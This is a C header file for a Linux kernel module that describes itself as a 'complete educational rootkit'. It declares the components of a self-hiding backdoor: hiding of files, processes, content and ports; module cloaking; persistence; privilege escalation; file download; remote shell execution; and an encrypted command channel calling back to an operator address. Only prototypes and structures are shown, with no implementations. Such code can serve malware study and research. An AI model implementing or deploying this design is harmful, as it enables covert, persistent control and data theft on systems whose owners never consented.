/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Complete educational rootkit: shared declarations.
 *
 * Constants, structures, externs, and prototypes used across all
 * subsystem files in the final integrated module.
 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <crypto/aead.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/spinlock.h>
#include <linux/types.h>

/* Crypto constants */
#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_NONCE_LEN	12
#define RK_TAG_LEN	16
#define RK_HDR_LEN	((int)sizeof(struct rk_envelope_hdr))

/* Direction tags for AEAD nonce construction */
#define RK_DIR_AGENT	0x00
#define RK_DIR_OPERATOR	0x01

/* Protocol constants */
#define RK_FRAME_MAX	65535
#define RK_BUF_MAX	4096

/* Target list dimensions */
#define RK_MAX_TARGETS	16
#define RK_TARGET_LEN	64

/* AEAD envelope header (used as AAD) */
struct rk_envelope_hdr {
	u8	version;
	u8	direction;
	__be64	session_id;
	__be64	sequence;
} __packed;

/* Encrypted session state, one per connection */
struct rk_session {
	struct crypto_aead	*tfm;
	struct socket		*sock;
	u64			session_id;
	u64			tx_seq;
	u64			rx_seq_expected;
};

/* Reply macro: send a string literal through the sealed channel */
#define RK_REPLY(s, str) rk_send_sealed((s), (const u8 *)(str), sizeof(str) - 1)

/* Target list with spinlock protection */
struct rk_target_list {
	spinlock_t	lock;
	char		targets[RK_MAX_TARGETS][RK_TARGET_LEN];
	int		count;
};

/* Port target list (u16 values, not strings) */
struct rk_port_list {
	spinlock_t		lock;
	unsigned short		ports[RK_MAX_TARGETS];
	int			count;
};

/* Global target lists (core/target.c) */
extern struct rk_target_list rk_file_targets;
extern struct rk_target_list rk_pid_targets;
extern struct rk_target_list rk_content_targets;
extern struct rk_port_list rk_port_targets;

/* Module params (core/init.c) */
extern unsigned short rk_peer_port;
extern char *rk_peer_address;
extern unsigned int rk_retry_base_ms;
extern unsigned int rk_retry_max_ms;
extern unsigned int rk_shell_timeout_ms;

/* Shared AEAD transform (core/init.c) */
extern struct crypto_aead *rk_tfm;

/* OPSEC state (core/opsec.c) */
extern bool rk_module_hidden;
extern bool rk_persist_active;

/* Target list operations (core/target.c) */
void rk_target_init(struct rk_target_list *list);
int rk_target_add(struct rk_target_list *list, const char *value);
int rk_target_remove(struct rk_target_list *list, const char *value);
bool rk_target_match(struct rk_target_list *list, const char *name);
bool rk_line_matches(struct rk_target_list *list,
		     const char *line, size_t len);
void rk_port_init(struct rk_port_list *list);
int rk_port_add(struct rk_port_list *list, unsigned short port);
int rk_port_remove(struct rk_port_list *list, unsigned short port);
bool rk_port_match(struct rk_port_list *list, unsigned short port);

/* Hiding hooks (core/filter.c) */
int rk_filter_init(void);
void rk_filter_cleanup(void);

/* Auto-OPSEC and module cloaking (core/opsec.c) */
void rk_auto_hide(struct socket *sock);
void rk_auto_unhide(void);
void rk_cloak_module(void);
void rk_uncloak_module(void);

/* Framing protocol, 2-byte length prefix (network/protocol.c) */
int rk_send_frame(struct socket *sock, const void *buf, size_t len);
int rk_recv_frame(struct socket *sock, void *buf, size_t max_len,
		  size_t *out_len);

/* AEAD envelope (crypto/envelope.c) */
int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len);
int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
		   size_t *out_len);

/* Command dispatch with function pointers (execution/dispatch.c) */
typedef int (*rk_handler_t)(struct rk_session *, const char *);
int rk_dispatch(struct rk_session *s, char *cmd);

/* Command handlers (execution/commands.c) */
int rk_cmd_ping(struct rk_session *s);
int rk_cmd_info(struct rk_session *s);
int rk_cmd_status(struct rk_session *s);
int rk_cmd_list(struct rk_session *s, const char *category);
int rk_cmd_unhide_all(struct rk_session *s);
int rk_cmd_hide_target(struct rk_session *s,
		       struct rk_target_list *list, const char *value);
int rk_cmd_unhide_target(struct rk_session *s,
			 struct rk_target_list *list, const char *value);
int rk_cmd_hide_port(struct rk_session *s, const char *arg);
int rk_cmd_unhide_port(struct rk_session *s, const char *arg);
int rk_cmd_hide_module(struct rk_session *s);
int rk_cmd_unhide_module(struct rk_session *s);
int rk_cmd_persist(struct rk_session *s);
int rk_cmd_unpersist(struct rk_session *s);
int rk_cmd_escalate(struct rk_session *s);
int rk_cmd_download(struct rk_session *s, const char *path);

/* Shell execution (execution/shell.c) */
int rk_cmd_exec(struct rk_session *s, const char *cmdline);

/* Agent callback thread (network/agent.c) */
int rk_agent_thread(void *data);

#endif /* ROOTKIT_H */
